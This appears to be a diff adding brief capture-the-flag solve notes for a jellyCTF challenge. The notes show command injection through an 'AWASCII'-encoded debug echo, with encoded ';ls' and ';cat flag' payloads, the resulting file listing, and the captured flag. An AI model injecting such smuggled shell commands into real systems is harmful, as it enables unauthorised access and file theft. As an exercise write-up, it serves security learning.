@@ -1,0 +1,26 @@
+goal: get code injection into debug statement
+eg "echo ;ls" and then "echo ;cat flag_location"
+
+";ls" translatees to "awawawawawawa awa awawa awa awa awa awa awawa awawa awa awa"
+
+AWASCII decoded result:
+Decoding AWASCII to sane human text: awawawawawawa awa awawa awa awa awa awa awawa awawa awa awa
+
+Dockerfile
+awafier_decoder.py
+awafier_maps.py
+flag
+main.py
+requirements.txt
+
+
+now we do ";cat flag"
+solve = "awawawawawawa awa awawawawa awawa awa awa awa awawa awa awawawawawawawawa awawa awa awawa awa awawawawa awawa awa awa awa awa awa awa awa awawa awa wa awawa awa awa awa"
+flag = "jellyCTF{m4st3rs_1n_awat1sm}"
+
+AWASCII decoded result:
+Decoding AWASCII to sane human text: awawawawawawa awa awawawawa awawa awa awa awa awawa awa awawawawawawawawa awawa awa awawa awa awawawawa awawa awa awa awa awa awa awa awa awawa awa wa awawa awa awa awa
+
+jellyCTF{m4st3rs_1n_awat1sm}
+
+see screenshot for construction
